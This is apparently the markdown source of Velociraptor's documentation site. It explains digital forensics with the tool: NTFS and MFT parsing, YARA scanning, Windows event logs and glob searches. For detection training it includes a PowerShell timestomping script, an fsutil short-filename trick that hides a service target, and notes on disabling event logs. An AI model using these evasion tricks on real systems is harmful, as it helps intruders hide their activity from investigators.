======
FILE: /content/youtube.md
======
+++
title = "YouTube"
type = "redirect"
target = "https://www.youtube.com/@velocidexenterprises8702/featured"
+++

---END OF FILE---

======
FILE: /content/discord.md
======
+++
title = "Discord"
type = "redirect"
target = "https://discord.gg/YAU3vRE"
+++

---END OF FILE---

======
FILE: /content/_index.md
======
---
title: "Welcome"
date: 2021-06-12T07:11:04Z
draft: false
noDisqus: true
weight: 20
no_header: true
carousel:
 - name: '<div class="logo-btn"><i class="fas fa-laptop"></i> Collect</div>'
   image: collect.png
   description: |
     At the press of a (few) buttons, perform targeted collection of digital forensic evidence simultaneously across your endpoints, with speed and precision.

 - name: <div class="logo-btn"><i class="fas fa-eye"></i> Monitor</div>
   image: monitoring.png
   description: Continuously collect endpoint events such as event logs, file modifications and process execution. Centrally store events indefinitely for historical review and analysis.

 - name: <div class="logo-btn"><i class="fas fa-bullseye"></i> Hunt</div>
   image: hunt.png
   description: Don't wait until an event occurs. Actively search for suspicious activities using our library of forensic artifacts, then customize to your specific threat hunting needs.

---

{{% notice warning "CVE-2025-0914 published on 2025-02-25" %}}

If you use the `prevent_execve` option, please upgrade your client to
mitigate `CVE-2025-0914` to at least release `0.73.4`. [More
details]({{% ref "/announcements/advisories/cve-2025-0914" %}})

{{% /notice %}}

## Velociraptor - Digging Deeper!

Velociraptor is an advanced digital forensic and incident response
tool that enhances your visibility into your endpoints.

{{% carousel %}}

---END OF FILE---

======
FILE: /content/docs/_index.md
======
---
title: "Documentation"
date: 2021-06-23T08:29:57Z
draft: false
weight: 20
pre: <i class="fas fa-book-reader"></i>
---

Welcome to Velociraptor's Documentation site.

{{% children %}}

After learning how Velociraptor's VQL artifacts can be used to gain
unprecedented visibility into the endpoint, continue on to consulting
the [VQL reference]({{< ref "/vql_reference" >}}) on this site.

If you are looking for more artifacts, visit our community driven 
[Artifact Exchange]({{< ref "/exchange" >}}) for the latest and 
greatest artifacts.


Finally check out the Velociraptor [Blog]({{< ref "/blog" >}}) for articles about
using Velociraptor in different scenarios and to learn more about
Velociraptor's features.

{{% notice note "Using Velociraptor integrated with Rapid7 InsightIDR?"%}}

Read the [InsightIDR documentation](https://docs.rapid7.com/insightidr/velociraptor-alerts) to learn more about how Velociraptor and InsightIDR work together.

{{% /notice %}}

---END OF FILE---

======
FILE: /content/docs/forensic/_index.md
======
---
title: "Forensic Analysis"
date: 2021-06-12T21:56:33Z
draft: false
weight: 45
---

In the previous sections we learned the syntax of VQL. But VQL is not
useful without a good set of plugins that make DFIR work
possible. Velociraptor's strength lies in the wide array of VQL
plugins and functions that are geared towards making DFIR
investigations and detections effective.

{{% children "description"=false %}}

---END OF FILE---

======
FILE: /content/docs/forensic/ntfs/_index.md
======
---
title: "NTFS Analysis"
date: 2021-06-26T20:10:17Z
description: |
   NTFS is the standard Windows filesystem. Velociraptor contains powerful NTFS analysis capabilities.

draft: false
weight: 50
---

NTFS is the standard Windows filesystem.  Velociraptor contains
powerful NTFS analysis capabilities. This section describes
Velociraptor's NTFS capabilities and does not aim to be a complete
description of NTFS itself. We will only introduce the basic and most
relevant concepts of NTFS and examine how these can be used in a
number of DFIR contexts.

## The Master File Table

In NTFS, all files are represented in a [Master File Table (MFT)](https://docs.microsoft.com/en-us/windows/win32/fileio/master-file-table). The
MFT is also a file within the filesystem with the special filename of
`$MFT`. While this special file is normally hidden by the API,
Velociraptor's NTFS parser makes it available to view, read or upload.

The `$MFT` file contains a sequence of `MFT Entries`, each of a fixed
size (usually 512 bytes). These entries contain metadata about files,
called `File Attributes`. The different attributes contain different
kinds of information about each file:

* Filename (Long name/Short name)
* Data attribute – contains file data runs.
* I30 attribute (contains directory listing)
* Security attributes such as ACLs

![The MFT and NTFS](image22.png)

Data attributes may be compressed or sparse and contain a list of
`runs` that comprise the content of the file. The data content is
stored elsewhere on the disk, but the location is stored within the
MFT entry.

In NTFS Each file may contain two different filenames, a long and a
short filename. Filename attributes contain their own timestamps.

{{% notice info "NTFS Long and short filenames" %}}

Although NTFS long and short filenames are usually closely related
(e.g. the short filename is the first part of the long filename with a
suffix such as `%1`), this is not a requirement.

It is very easy to create a file with a completely different short
filename to its long filename. This can be problematic if you are
looking for references to the long filename from e.g. registry keys.

In the below example, I set the shortname of the `velociraptor.exe`
binary to `runme.exe`. I can then create a service that launches
`runme.exe` instead. Tools that only show the long filename of the
directory will fail to show the file and analysis may conclude that
the service target is missing from the filesystem.

```shell
C:\Users\test>fsutil file setshortname velociraptor.exe runme.exe
C:\Users\test>dir /x *.exe
 Volume in drive C has no label.
 Volume Serial Number is 9459-F443

 Directory of C:\Users\test

08/19/2018  11:37 PM        12,521,472 RUNME.EXE    velociraptor.exe
               2 File(s)     16,140,732 bytes
               0 Dir(s)  11,783,704,576 bytes free
C:\Users\test>runme.exe -h
usage: velociraptor [<flags>] <command> [<args> ...]
```

{{% /notice %}}

## The `ntfs` accessor

Velociraptor has a complete NTFS parser able to access files and
directories by parsing the raw NTFS filesystem from the raw device. To
make it easy to utilize this parser with VQL, Velociraptor implements
the `ntfs` accessor (For a description of accessors, see [here]({{< ref "/docs/forensic/filesystem/#filesystem-accessors" >}}) ).

The `ntfs` accessor makes it possible to see and access the normally
hidden NTFS files such as `$MFT`. It also makes it possible to see
Alternate Data Streams (ADS), which are additional data streams
attached to the same MFT entry.

![NTFS accessor](image24.png)

The NTFS accessor makes NTFS specific information available in the
Data field. For regular files it includes the inode string, as well as
the short filename.

When providing a path to the `ntfs` accessor, the first part of the
path is interpreted as the `drive letter` or the `device part`.

For example providing a path starting with `C:` or `D:`, will be
converted internally to Windows device notation, for example `\\.\C:`
or `\\.\D:`. The `ntfs` accessor then uses this to open the raw
logical device so it can be parsed.

This means that all paths returned from the `ntfs` accessor start with
the device name, e.g. `\\.\C:`.

{{% notice tip "NTFS parsing and full disk encryption" %}}

Since Velociraptor operated on the logical device it if not affected
by full disk encryption such as Bitlocker. Velociraptor will be able
to parse the raw NTFS filesystem regardless of the disk encryption
status.

{{% /notice %}}

## Volume Shadow Copies

NTFS allows for a special copy on write snapshot feature called
`Volume Shadow Copy` or `VSS`. You can think of a VSS as a light
weight snapshot of the current filesystem without needing to copy any
data (future writes will simply be diverted to the current active
snapshot).

On server class Windows systems, you can create a VSS copy on your own
machine using `vssadmin create shadow`, but on other Windows versions
you will need to do this via WMI:

![Creating shadow copy](image33.png)

When a VSS copy is created, it is accessible via a special
device. Velociraptor allows the VSS copies to be enumerated by listing
them at the top level of the filesystem.  At the top level, the
accessor provides metadata about each device in the `Data` column,
including its creation time. This is essentially the same output as
`vssadmin list shadows`. In the below screenshot we can see the `Data`
column of the fixed `C:` drive and the VSS device.

![VSS info](image28.png)

## Operating on VSS

Because the `ntfs` accessor treats all devices at the first top level
directory, it is possible to see the same file in all VSS copies at
the same time. For example, the following finds all VSS copies of the
event logs:

![VSS globbing](image31.png)

Simply use the VSS device name as a prefix to all paths and the ntfs
accessor will parse it instead.

You can use it to analyze older versions of the drive!

## Parsing the MFT

Since the `ntfs` accessor allows accessing the `$MFT` file as a
regular file, you can download the entire $MFT file from the endpoint
using the ntfs accessor, then process it offline. For example using
the `Windows.Search.FileFinder` artifact with the `ntfs` accessor - or
simply using the VQL:

```sql
SELECT upload(path="C:/$MFT", accessor="ntfs")
FROM scope()
```

However, in practice this is inefficient and does not scale. Typically
we want to parse the MFT in order to answer some questions about the
system, such as which files were modified within a timerange.

Velociraptor provides access to the $MFT parser using the
`parse_mft()` plugin, so the MFT can be parsed directly on the
endpoint using Velociraptor. The plugin emits a high level summary of
each MFT entry, including its timestamps (for the
$STANDARD_INFORMATION and $FILENAME streams) and MFT ID.

This plugin is most useful when you need to pass over all the files in
the disk - it is more efficient than a recursive glob and might
recover deleted files. For example to recover all the files with a
.exe extension from the drive:

```sql
SELECT * FROM parse_mft(filename="C:/$MFT", accessor="ntfs")
WHERE FileName =~ ".exe$"
```

## MFT Entries

An MFT Entry can have multiple attributes and streams. While
`parse_mft()` plugin emits a high level summary for each entry,
sometimes we need more information on each MFT entry. This information
is provided by the `parse_ntfs()` VQL function which accepts and MFT
ID:

![Parse ntfs](image39.png)

The MFT ID can be take from the output of `glob()` or `parse_mft()`.

{{% notice tip "What is this inode all about?" %}}

In the above you will sometimes see the term `inode` referred to. This
term traditionally comes from the Sleuthkit and is a string consisting
of a triple of mft id, type id and stream id, e.g. `974-16-0`
representing a stream of data

{{% /notice %}}

## NTFS timestamps

A single MFT entry can have up to 16 timestamps, based on different
attributes:

* The $STANDARD_INFORMATION attribute contains 4 timestamps (Modified, Accessed, Inode Changed, Born)
* There are often 2 $FILENAME attributes for a short name and a long name, each will have 4 further timestamps.
* The $I30 stream of the parent directory also contains 4 timestamps for the file.

Timestamps are critical to forensic investigations as they help to
establish a timeline of activity on the system.

### Timestomping

Attackers sometimes change the timestamps of files to make them less
obvious. E.g make malware look like it was installed many years
ago. This makes timelines more difficult to establish and might cause
you to miss important filesystem events.

For the next exercise we will stomp over some times. Use the following
powershell to stomp over Velociraptor.exe’s timestamps.

```powershell
$file = 'C:\Program Files\Velociraptor\Velociraptor.exe'
$stomp = Get-Date 2007-07-07
$(Get-Item $file).creationtime = $stomp
$(Get-Item $file).lastaccesstime = $stomp
$(Get-Item $file).lastwritetime = $stomp
Get-ChildItem $file | Select *, Fullname, *Time*
```

![Before](image44.png)
![After](image38.png)


The above script uses the API to change the times of a file but this
only changes the $STANDARD_INFORMATION stream. The real times are
still present on the $FILENAME attributes. A common detection to this
is to find files which have $STANDARD_INFORMATION times earlier then
the $FILENAME times. When the file is created, $FILENAME times are set
to the real times, then if the API is used to send the timestamps
backwards the $STANDARD_INFORMATION timestamps will appear earlier
than the $FILENAME times.

![Timestomp detection](image42.png)


{{% notice warning "Timestomping detection pitfalls" %}}

Although it might appear to be a solid detection to timestomping,
generally timestomping detections are not very reliable in
practice. It turns out that a lot of programs set file timestamps
after creating them into the past by design - mostly archiving
utilities like 7zip or cab will reset the file time to the times
stored in the archive.

Conversely it might appear that the $FILENAME times are the most
reliable and should be mostly relied upon in an investigation since
they are not directly modifiable by the Win32 APIs.

Unfortunately this is not the case - the $FILENAME attributes can be
easily modified by simply renaming the file (after timestomping) and
rename it back. Windows will copy the timestamps from the
$STANDARD_INFORMATION attribute to the $FILENAME when renaming the
file.

{{% /notice %}}

## Timeline analysis

Timelines in forensic analysis are very important as they place events
in chronological order and may reveal causal relationships.  We can
get a timeline by sorting the table on the modified or birth
timestamps.

```sql
SELECT * FROM parse_mft(filename="C:/$MFT", accessor="ntfs")
WHERE Created0x30 > "2020-01-02"
ORDER BY Created0x30
```

It is more efficient to narrow the time of interest first.

## The $I30 INDX stream

In NTFS a directory is simply an MFT entry with $I30 streams. The
streams contains a B+ tree of the MFT entries in the directory.

Since INDX streams are a B+ tree when a record is deleted, the tree
will be reordered. Sometimes this leaves old entries in the slack
space. INDX stream is allocated in 4096 byte blocks which leaves a lot
of slack space to potentially hold residual data.

![I30 slack](image54.png)

Velociraptor can report on the $I30 streams and carve out headers from
slack using the `parse_ntfs_i30()` function as discussed in [this
article](https://www.fireeye.com/blog/threat-research/2012/10/incident-response-ntfs-indx-buffers-part-4-br-internal.html). An
example query:

```sql
SELECT * FROM foreach(
   row={
     SELECT FullPath, Data.mft AS MFT
     FROM glob(globs=DirectoryGlobs, accessor="ntfs")
     WHERE IsDir
   },
   query={
     SELECT FullPath, Name, NameType, Size, AllocatedSize,
            IsSlack, SlackOffset, Mtime, Atime, Ctime, Btime, MFTId
     FROM parse_ntfs_i30(device=FullPath, inode=MFT)
})
```

## The USN journal

Update Sequence Number Journal or Change journal is maintained by NTFS
to record filesystem changes. Primarily designed to support backup
programs, the USN journal records metadata about filesystem changes.

The journal resides in the path `$Extend\$UsnJrnl:$J` and is normally
a hidden NTFS internal file (so it can only be accessed via the `ntfs`
accessor).

Windows appends USN records to the end of the file. However, the file
is sparse - periodically NTFS will remove the range at the start of
the file to make it sparse and preserve disk space.

Typically the file will report a huge size but will actually only take
about 30-40mb on disk since the first part of the file is sparse.

![The USN journal](image43.png)

When collecting the journal file, Velociraptor will collect the sparse
file only (Velociraptor is aware of sparse files and preserves their
sparse ranges by adding an additional `.idx` file to the collection
with the ranges containing real data. You can see this in the
`Uploaded Files` tab of the collection - the file size is reported to
be very large, however only about 30mb was actually collected.

![The USN journal collected](image47.png)


{{% notice tip %}}

Downloading the file from the `Uploaded Files` tab will pad the sparse
regions and produce a large file with ranges of 0 in it. On the other
hand, exporting the zip file from the `Overview` tab will store the
collected file and the `idx` range file into the zip file so will only
store about 30mb.

{{% /notice %}}

### Parsing USN journal

Velociraptor can parse each entry in the USN journal directly on the
endpoint. This allows for queries to target specific files or times of
interest on the endpoint.

Since the beginning of the file is sparse, we start parsing from the
first valid range.

The USN journal may record interactions with files that have been
removed. Many files represent evidence of system interaction (such as
lnk files or prefetch files) and the USN journal can therefore uncover
the "smoking gun" when the system was initially compromised.

![The USN journal](image60.png)

You can collect the USN journal using the `Windows.Forensics.Usn`
artifact.

{{% notice tip %}}

The USN journal contains so much valuable evidence that it might be worth carving for USN records from the raw disk. Although this is a slow process it can yield very good results if your are lucky - see [this blog post]({{< ref "/blog/2021/2021-06-16-carving-usn-journal-entries-72d5c66971da/" >}}) for more information.

{{% /notice %}}

---END OF FILE---

======
FILE: /content/docs/forensic/searching/_index.md
======
---
title: "Searching Content"
description: |
  A powerful DFIR technique is searching bulk data for patterns. YARA is a
  powerful keyword scanner that allows to search unstructured binary data
  based on user provided rules.

date: 2021-06-17T02:30:41Z
draft: false
weight: 30
---

A powerful DFIR technique is searching bulk data for patterns. Some
examples include:

* Searching for CC data in process memory
* Searching for URLs in process memory
* Searching binaries for malware signatures
* Searching registry for patterns

Bulk searching helps to identify evidence without needing to parse file formats

## YARA - The swiss army knife

YARA is a powerful keyword scanner that allows to search unstructured
binary data based on user provided rules. YARA is optimized to scan
for many rules simultaneously, making is an excellent choice for
detecting suspicious binaries using common patterns.

Velociraptor supports YARA scanning of bulk data (via accessors) and
memory using the `yara()` and `proc_yara()` plugins.

An example of a YARA rule is shown below.

```yara
rule X {
   strings:
       $a = “hello” nocase
       $b = “Goodbye” wide
       $c = /[a-z]{5,10}[0-9]/i

   condition:
       $a and ($b or $c)
}
```

The rule consists of a `strings` section and a `condition`
section. Strings represent a set of keywords which might include ASCII
or UTF16 encoded strings, as well as regular expressions. You can refer to the [Yara rules reference page](https://yara.readthedocs.io/en/stable/) to learn about how to construct rules.

{{% notice tip "The Yara plugin and accessors" %}}

The `yara()` VQL plugin can accept an optional `accessor`
parameter. If the accessor is specified, the plugin will read chunks
of data from the accessor and apply the YARA rules on the string in
memory. This allows you to apply YARA rules on any data that is
available via an accessor including raw strings (using the `data`
accessor), registry values (using the `registry` accessor) or NTFS
parsed data (using the `ntfs` accessor) for example.

While this is convenient, it means that rules that examine the entire
file will not work as expected. For example, the YARA `pe` module
looks at the PE header, but when the file is read in chunks, only the
first chunk contains the PE header. Similarly YARA rules that contain
an expression checking a file offset will not work because the rules
are applied to buffers in memory.

When an accessor is not specified, the `yara()` plugin assumes the
filename refers to a filesystem path, and simply allows the YARA
library to scan the file as is. The YARA library uses `mmap()` to map
the entire file into memory and can therefore optimize the scan across
the entire file.

It is therefore much faster to not specify an accessor to the `yara()`
plugin if you just need to scan files on disk.

{{% /notice %}}

### Example: drive by download

You suspect a user was compromised by a drive by download (i.e. they
clicked and downloaded malware delivered by mail, ads etc).

You think the user used the Edge browser but for this example, assume
you have no idea of the internal structure of the browser
cache/history etc.  Write an artifact to extract potential URLs from
the Edge browser directory.

```sql
LET YaraRule = '''
rule URL {
  strings: $a = /https?:\\/\\/[a-z0-9\\/+&#:\\?.-]+/i
  condition: any of them
}
'''

SELECT * FROM foreach(
row={
   SELECT FullPath FROM glob(globs='''C:\Users\*\AppData\Local\Microsoft\Edge\**''')
}, query={
   SELECT str(str=Strings.Data) AS Hit,
          String.Offset AS Offset,
          FileName
   FROM yara(files=FullPath, rules=YaraRule)
})
```

![URL scanning](image18.png)

## YARA best practice

You can get yara rules from many sources (threat intel, blog posts
etc) or you can write your own. Rules may be very specific, in which
case a hit may represent a valuable signal. If the YARA rule is too
loose, the likelihood of a false positive increases, and further
postprocessing will be required to verify the hits.

Try to collect additional context around the hits to eliminate false
positives. You can use other plugins to help verify other aspects of
each hit before reporting it, thereby eliminating false positives.

Yara scanning is relatively expensive since we need to read data from
disk! consider more targeted glob expressions to limit the number of
disk reads Velociraptor will need to do to evaluate the query. If you
find you do need to scan a lot of data, consider specifying client
side throttling when launching the collection or hunt (using the
Ops/Sec mechanism) - usually YARA scanning is not time critical.


## Uploading files

One of the unique capabilities of Velociraptor is uploading file
content from the endpoint. While the actual mechanism of uploading the
file to the server is abstracted away, triggering a file upload from
VQL is a simple matter of calling the `upload()` function. This makes
it trivial to upload files based on any criteria of the query.

The `upload()` function simply requires an accessor and a filename to
read the file out, and the file is uploaded to the server
automatically. Optionally the function may also take a `name`
parameter which renames the file as sent to the server.

### Example: Collect all executables in users’ home directory

This is a common use of combining a `glob()` plugin with an
`upload()` function:

```sql
SELECT upload(file=FullPath) AS Upload
FROM glob(globs='''C:\Users\*\Downloads\*''')
WHERE NOT IsDir
```

---END OF FILE---

======
FILE: /content/docs/forensic/event_logs/_index.md
======
---
title: "Event Logs"
date: 2021-06-27T04:34:03Z
draft: false
weight: 80
---

## Windows Event Logs

The Windows event logs are stored in files with extension of `*.evtx`
typically stored within `C:\Windows\System32\WinEVT\Logs\*.evtx`

Unlike traditional unix style log files that consist of unstructured
text, Windows EVTX files are stored in a binary format with several
advantages:

* Rollover - The EVTX file is divided into chunks and new chunks can
  overwrite older chunks. This allows the file size to be limited, and
  when the event log fills up, events simply rotate into the start of
  the file overwriting older events.
* Binary XML format provides some compression. Although not as much
  compression as gzip or bzip, EVTX files use a binary encoding to
  save some space over plain XML.
* Structured records with strong types - This is perhaps the most
  important difference with Unix style logs. Structured logs allow for
  accurate and fast filtering of log files and obviate the need to
  parse unstructured text.

{{% notice note "EVTX filtering in JSON" %}}

While the EVTX file is actually XML based, Velociraptor converts it
internally into a JSON object to make it easier to filter specific
fields using VQL constructs.

{{% /notice %}}

Velociraptor implements a parser for EVTX files in the `parse_evtx()`
plugin. The plugin takes an accessor and a filename to open the EVTX
file, and produces a single row per event.

![Parsing an EVTX file on the command line](image11.png)

Each event row contains three main columns:

1. The `System` column is a JSON object representing the event
   metadata that is common to all events, such as timestamp.
2. The `EventData` or `UserData` columns are free form JSON objects
   representing application specific information specific to the event
   type recorded.

Some of the more interesting event fields include

* Provider, Channel, Computer:  these represents the source of the message (more below).
* Event ID: An index into the message table identifying the type of this event
* EventRecordID: The ID of this message within the evtx file.

## Event Messages

The Windows Event Logs architecture does **NOT** store the event
message in the evtx file! Instead, the event log refers to an
externally provided message, and the viewer application looks up the
message in a database in order to display it.

This scheme has a number of advantages:

1. Saves some small amount of space in the evtx files
   themselves. Since the bulk of the event message is not stored in
   the file at all, storage is saved - particularly for repetitive
   events with large message strings.
2. Probably the main reason for this scheme is that it allows for
   event message internationalization - the message string can be
   tailored for the viewer's language regardless of the language set on
   the system that generated the event.

The below example shows a familiar event on a Chinese language system.

![Chinese message](image9.png)

The event viewer is able to show a friendly message in the local
language, however closer inspection of the event data itself indicates
the message is not found within the `EventData` field.

![Chinese message event](image8.png)

### Deriving event messages

How does the Windows event viewer resolve the messages when displaying an event?

Using the `provider`, `channel` and `computer name`, the event viewer
looks up the registry key
`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\<channel>\<provider>`
and reads the value `EventMessageFile`.

The value will point at a path to a DLL. The event viewer will then
open the DLL and search the resource section of this dll for a
`Message Table` resource.

The `Message Table` is simply a table of strings. The event viewer
will then use the Event ID as an index to this message table to
retrieve the message string for the event.

The message string is a formatted string with placeholders such as
`%1`, `%2` etc. The event viewer will then Interpolate the UserData
section into the full string.

![Message lookup](image18.png)

### Difficulty with the EVTX format

While the EVTX file format does have some advantages is falls short in
practice on a number of levels. It is important investigator are aware
of the pitfalls

> Grabbing all the EVTX files off the system may result in loss of event messages!

The event description message contains vital context about what the
event actually means.  Without the message it would be difficult to
know what each event message represents.

If we upload the EVTX files themselves from the system, and attempt to
view them offline chances are that the event message would be missing
on our analysis system. If we are lucky, we would be able to find some
information about the message using an internet search for the event
id.

![Searching the internet for unknown event IDs](image21.png)

If you just collect the EVTX files from one system to another you will
lose access to message tables, because the messages are in DLL files
scattered across the entire system.

Additionally, if an application is uninstalled, its message DLLs will
be removed and earlier events are not able to be displayed any more.

{{% notice tip %}}

In order to improve the state of event log messages, we started
maintaining a set of Event Message databases in the
https://github.com/Velocidex/evtx-data repository. This repository
contains sqlite databases of many known message tables collected from
different systems.

You can instruct Velociraptor to use one of those databases using the
`message_db` parameter to `parse_evtx()`.

{{% /notice %}}


## Disabling event logs

Event logs can be easily disabled by simply right clicking in event
viewer and selecting `Disable Logs`. The below example shows how I am
disabling the `Microsoft-Windows-Bits-Client/Operational` log.

![Disabling logs](image25.png)

To read the full analysis of how to detect such a registry modification, read the [blog post]({{< ref "blog/2021/2021-01-29-disabled-event-log-files-a3529a08adbe/" >}}), or simply check for modifications using the `Windows.EventLogs.Modifications` artifact.

## Event Tracing for Windows (ETW)

ETW is the underlying system by which event logs are [generated and collected](https://docs.microsoft.com/en-us/windows-hardware/test/weg/instrumenting-your-code-with-etw). The following diagram illustrates an overview of ETW.

![ETW Architecture](image23.png)

ETW is essentially a broker between `Providers` and `Consumers`. A
Provider is registered with the system using a GUID and advertises
itself as being able to provide ETW events. A Consumer is a routine
that registers interest in a provider (e.g. Velociraptor is a
consumer).

You can enumerate all providers on a system using the `logman query
providers` command which lists all the ETW providers' GUIDs.

![Enumerating ETW providers](providers.png)

### Watching for events with VQL

In VQL watch_etw() can be used to watch for ETW events. For example,
consider the event provider `Microsoft-Windows-DNS-Client` with the
GUID `{1C95126E-7EEA-49A9-A3FE-A378B03DDB4D}`

![Watching for ETW events in real time](image31.png)

{{% notice tip %}}

ETW and event logs are just two sides of the same coin. If it possible
to listen to events on the ETW layer before they are forwarded to the
event log service. In this case the events are not susceptible to
being stopped by disabling the log (as shown previously)

{{% /notice %}}

## Example - Use ETW to monitor to DNS queries

We can query the DNS client ETW provider for all DNS lookup events.

![Monitor DNS queries via ETW](image32.png)

Client event monitoring queries automatically forward events to the server.

![View DNS queries from client monitoring logs](image29.png)

---END OF FILE---

======
FILE: /content/docs/forensic/filesystem/_index.md
======
---
title: "Searching Filenames"
description: |
    One of the most common operations in DFIR is searching for files
    based on their file names.

date: 2021-06-12T23:25:17Z
draft: false
weight: 20
---

One of the most common operations in DFIR is searching for files
efficiently. When searching for a file, we may search by filename,
file content, size or other properties.

Velociraptor has the `glob()` plugin to search for files using a glob
expression. Glob expressions use wildcards to search the filesystem
for matches, and these are the most common tool for searching by
filename. As we will see below, the `glob()` plugin is the foundation
for many other artifacts.

The `glob()` plugin searches the filesystem by glob expression. The
following represent the syntax of the glob expressions:

* A `*` is a wildcard match (e.g. `*.exe` matches all files ending
  with ".exe")
* Alternatives are expressed as comma separated strings in `{}`. For
  example, `*.{exe,dll,sys}`
* Velociraptor supports recursive wildcards: A `**` denotes recursive
  search, e.g. `C:\Users\**\*.exe`. NOTE: A `**` must appear in its
  own path component to be considered a recursive search:
  `C:\Users\mike**` will be interpreted the same as `C:\Users\mike*`
* A Recursive search `**` can be followed by a number representing the
  depth of recursion search (default 30).

For example, the following quickly searches all users' home
directories for files with ".exe" extension.

```sql
SELECT * FROM glob(globs='C:\\Users\\**\\*.exe')
```

{{% notice warning "String escaping and VQL" %}}

VQL strings can include a backslash escape sequence. Since Windows
paths often use backslashes for path separator you will need to escape
the backslashes. Alternatively paths can be written with a forward
slash `/` or a raw VQL string can be used - for example this is a bit
easier to write:

```sql
SELECT * FROM glob(globs='''C:\Users\**\*.exe''')
```

{{% /notice %}}

The `glob()` plugin is optimized to visit files on the filesystem as
quickly as possible. Therefore if multiple glob expressions are
provided, the `glob()` plugin will combine them into a single
expression automatically to reduce filesystem access. It is always
better to provide multiple glob expressions than to run the `glob()`
plugin multiple times. For example the following will only make a
single pass over the filesystem while searching for both exe and dll
files.

```sql
SELECT * FROM glob(globs=['C:/Users/**/*.exe',
                          'C:/Users/**/*.dll'])
```

Velociraptor paths are separated by `/` or `\` into path
components. Internally, paths are considered as made up of a list of
components. Sometimes path component (e.g. a file or directory) can
also contain path separator characters in which case the component is
quoted in the path.

To learn more about how paths are used in Velociraptor see [Velociraptor Paths]({{< ref "/docs/forensic/filesystem/paths/" >}})

### The Glob Root

Glob expressions are meant to be simple to write and to
understand. They are not as powerful as a regular expression, with
only a few types of wildcard characters allowed (e.g. `*` or
`?`). However, what if we wanted to literally match a directory which
also contained a wildcard character?

This problem is encountered quite often: Normally we know an exact
directory path and simply want to search beneath this directory using
glob. Consider a directory like `C:\Users\Administrator\{123-45-65}` -
this is common as directories are often named as GUID - especially in
the registry.

If we used the above in a glob expression, the `glob()` plugin will
assume `{123-45-65}` is an alternative wild card. It will therefore
only match a directory exactly named `123-45-65`. We can therefore use
the `root` parameter to tell `glob()` to only start searching from
this exact directory name:

```vql
SELECT *
FROM glob(globs='**', root='''C:\Users\Administrator\{123-45-65}''')
```

Note that the root path is **not** a glob expression but represents
exactly a single path forming the directory under which we start
searching. Similarly the glob parameters now refer to wildcard matches
under that root directory.

### Glob results

The `glob()` plugin returns rows with several columns. As usual, the
best way to see what a plugin returns is to click the `Raw Response JSON`
button on the results table.

![Glob output](glob_results.png)

Some of the more important columns available are

1. The `OSPath` is the complete path to the matching file, whereas
   the `Name` is just the filename.
2. The `Mtime`, `Atime`, `Ctime` and `Btime` are timestamps of the file.
3. The `Data` column is a free form dictionary containing key/value
   data about the file. This data depends on the accessor used.
4. `IsDir`, `IsLink` and `Mode` indicate what kind of file
   matched. (`Mode.String` can present the mode in a more human
   readable way).
5. Finally the `glob()` plugin reports which glob expression matched
   this particular file. This is handy when you provided a list of
   glob expressions to the plugin.


## Filesystem accessors

Glob is a very useful concept to search hierarchical trees because
wild cards are easy to use and powerful. Sometimes we might want to
use a glob expression to look for other things that are not files, but
also have a hierarchical structure. For example, the registry is
organized in a similar way to a filesystem, so maybe we can use a glob
expression to search the registry?

Velociraptor supports direct access to many different data sources
with such hierarchical trees via `accessors` (Accessors are
essentially filesystem access drivers). Some common accessors are

* **file** - uses OS APIs to access files.
* **ntfs** - uses raw NTFS parsing to access low level files
* **registry** - uses OS APIs to access the windows registry

When no accessor is specified, Velociraptor uses an automatic accessor
(called **auto**): On Windows, the **auto** accessor uses the **file**
accessor to attempt to read the file using the OS APIs, but if the
file is locked (or it received permission denied errors), Velociraptor
automatically falls back to the **ntfs** accessor in order to read the
file from raw disk clusters. This allows Velociraptor to transparently
bypass any OS level restrictions on reading files (such as filesystem
permissions or some filter drivers that block access to files based on
other rules - sometimes found in local security software).

### The registry accessor

This accessor uses the OS API to access the registry hives. The top
level directory is a list of the common hives (e.g. `HKEY_USERS`). The
accessor creates a registry abstraction to make it appear as a
filesystem:

* Top level consists of the major hives
* Values appear as files, Keys appear as directories
* The Default value in a key is named “@”
* Since reading the registry value is very quick anyway, the registry
  accessor makes the Value's content available inside the Data
  attribute.
* Can escape components with `/` using quotes
`HKEY_LOCAL_MACHINE\Microsoft\Windows\"http://www.microsoft.com/"`

### Raw registry parsing

In the previous section we looked for a key in the `HKEY_CURRENT_USER`
hive.  Any artifacts looking in `HKEY_USERS` using the Windows API are
limited to the set of users currently logged in! We need to parse the
raw hive to reliably recover all users.

Each user’s setting is stored in `C:\\Users\\<name>\\ntuser.dat` which
is a raw registry hive file format. We can parse this file using the
`raw_reg` accessor.

When we need to parse a key or value using the raw registry we need to
provide it with 3 pieces of information:

1. The Registry hive file to parse (**path**)
2. The Accessor to open that file (**scheme**)
3. The Key or Value path within the registry file to open (**fragment**)

Since the accessor can only receive a single string (file path), we
pass these three pieces of information using a URL notation.

{{% notice warning "URL manipulating" %}}

Do not attempt to build the URL using string concatenation because
this will fail to escape properly. Always use the `url()` VQL function
to build the URL for use by the raw_reg accessor.

{{% /notice %}}

![Raw Registry](raw_reg.png)

In the above example, we specify to the `glob()` plugin that we want
to open the raw registry file at `C:\\Users\\Mike\\ntuser.dat` and
glob for the pattern `/*` within it.

Note that the FullPath returned by the accessor is also in URL
notation. This is done so that you can feed the FullPath directly to
any plugin that uses filenames without conversion - since the raw
registry accessor can read the urls it is producing.

If you need to extract the key path within the registry hive, you can
use the `url()` function with the `parse` argument to parse the url
again. The `Fragment` field represents the key path.

```text
url(scheme='file', path='C:/Users/test/ntuser.dat', fragment='/**/Run/*')

file:///C:/Users/test/ntuser.dat#/**/Run/*
```

#### Example: Find autorun files from ntuser.dat

Let's combine the above query to search all Run keys in all user's
ntuser.dat files.

```sql
SELECT * FROM foreach(
row={
   SELECT FullPath AS NTUserPath FROM glob(globs="C:/Users/*/ntuser.dat")
}, query={
   SELECT NTUserPath, url(parse=FullPath).Fragment AS Value, Mtime, Data.value
   FROM glob(
       globs=url(scheme="file", path=NTUserPath,
                 fragment="SOFTWARE/Microsoft/Windows/**/Run/*"),
       accessor="raw_reg")
})
```

We glob for ntuser.dat files in all user's home directory, then
foreach one of those, we search the raw registry hive for values under
the Run or RunOnce key.

![Raw Registry Run keys](raw_reg_run.png)

### The "data" accessor

VQL contains many plugins that work on files. Sometimes we load data
into memory as a string.  It is handy to be able to use all the normal
file plugins with literal string data - this is what the `data`
accessor is for - when the data accessor is used, it creates an
in-memory file with the content of the file being the string that is
passed as the filename.

This allows us to use strings in plugins like `parse_csv()`

---END OF FILE---

======
FILE: /content/docs/forensic/filesystem/remapping/_index.md
